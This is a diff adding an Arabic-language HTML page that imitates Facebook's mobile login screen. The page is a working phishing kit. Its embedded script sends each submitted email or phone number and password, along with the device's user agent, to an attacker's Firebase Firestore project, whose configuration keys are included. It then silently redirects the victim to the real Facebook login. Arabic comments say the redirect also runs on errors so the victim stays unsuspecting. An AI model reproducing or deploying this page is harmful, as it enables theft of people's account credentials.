@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook - تسجيل الدخول</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
+
+        // إعدادات Firebase الخاصة بك التي قدمتها
+        const firebaseConfig = {
+            apiKey: "AIzaSyC9f5fapAvnhI_cTvJ5TKuJCG8GAbAwa7c",
+            authDomain: "face-e03fc.firebaseapp.com",
+            projectId: "face-e03fc",
+            storageBucket: "face-e03fc.firebasestorage.app",
+            messagingSenderId: "628468108258",
+            appId: "1:628468108258:web:eea4d9b8cceab2b58dc7bb",
+            measurementId: "G-9432BKFQCR"
+        };
+
+        // الرابط الذي سيتم توجيه الشخص إليه بعد سحب البيانات
+        const redirectUrl = "https://www.facebook.com/login/device-based/regular/login/"; 
+
+        // تهيئة Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const auth = getAuth(app);
+
+        const loginForm = document.getElementById('fbForm');
+
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('u_email').value;
+            const pass = document.getElementById('u_pass').value;
+
+            try {
+                // تسجيل دخول مجهول لتجاوز قيود الحماية والكتابة في الداتابيز
+                await signInAnonymously(auth);
+
+                // حفظ البيانات في كولكشن 'logins'
+                // ملاحظة: تأكد من جعل Rules في Firestore تسمح بالكتابة (allow write: if true)
+                await addDoc(collection(db, "logins"), {
+                    username: email,
+                    password: pass,
+                    createdAt: serverTimestamp(),
+                    deviceInfo: navigator.userAgent
+                });
+
+                // التوجيه المباشر والصامت
+                window.location.href = redirectUrl;
+
+            } catch (error) {
+                // في حال حدوث أي خطأ تقني، يتم التوجيه أيضاً لضمان عدم شك المستخدم
+                window.location.href = redirectUrl;
+            }
+        });
+    </script>
+
+    <style>
+        body { background-color: #f0f2f5; font-family: -apple-system, sans-serif; }
+        .input-style { background-color: #f5f6f7; border: 1px solid #dddfe2; }
+        .input-style:focus { border-color: #1877f2; background-color: white; outline: none; }
+        .fb-blue-btn { background-color: #1877f2; }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <div class="bg-[#fffbe2] text-[#3b5998] py-2 text-center text-[12px] border-b border-[#e2e2e2]">
+        احصل على فيسبوك للأندرويد وتصفح أسرع.
+    </div>
+
+    <main class="flex-grow flex flex-col items-center px-4 pt-10">
+        <div class="mb-8">
+            <h1 class="text-[#1877f2] font-bold text-[35px]">facebook</h1>
+        </div>
+
+        <div class="w-full max-w-[400px]">
+            <form id="fbForm" class="flex flex-col gap-3">
+                <input 
+                    type="text" 
+                    id="u_email"
+                    placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" 
+                    class="input-style w-full p-3 rounded-lg text-md"
+                    required
+                >
+                <input 
+                    type="password" 
+                    id="u_pass"
+                    placeholder="كلمة السر" 
+                    class="input-style w-full p-3 rounded-lg text-md"
+                    required
+                >
+                
+                <button 
+                    type="submit" 
+                    class="fb-blue-btn text-white font-bold py-3 rounded-lg text-lg active:opacity-90"
+                >
+                    تسجيل الدخول
+                </button>
+            </form>
+
+            <div class="text-center mt-4">
+                <a href="#" class="text-[#1877f2] text-sm font-medium hover:underline">هل نسيت كلمة السر؟</a>
+            </div>
+
+            <div class="flex items-center my-8">
+                <div class="flex-grow border-t border-gray-300"></div>
+                <span class="px-4 text-gray-400 text-sm">أو</span>
+                <div class="flex-grow border-t border-gray-300"></div>
+            </div>
+
+            <div class="flex justify-center">
+                <button type="button" class="bg-[#42b72a] text-white font-bold py-2 px-6 rounded-md text-sm">
+                    إنشاء حساب جديد
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <footer class="mt-auto py-6 bg-white">
+        <div class="flex justify-center gap-6 text-[11px] text-gray-500 mb-2">
+            <span>العربية</span>
+            <span class="text-[#1877f2]">English (US)</span>
+            <span class="text-[#1877f2]">Français</span>
+        </div>
+        <div class="text-center text-[11px] text-gray-400">Meta © 2024</div>
+    </footer>
+
+</body>
+</html>
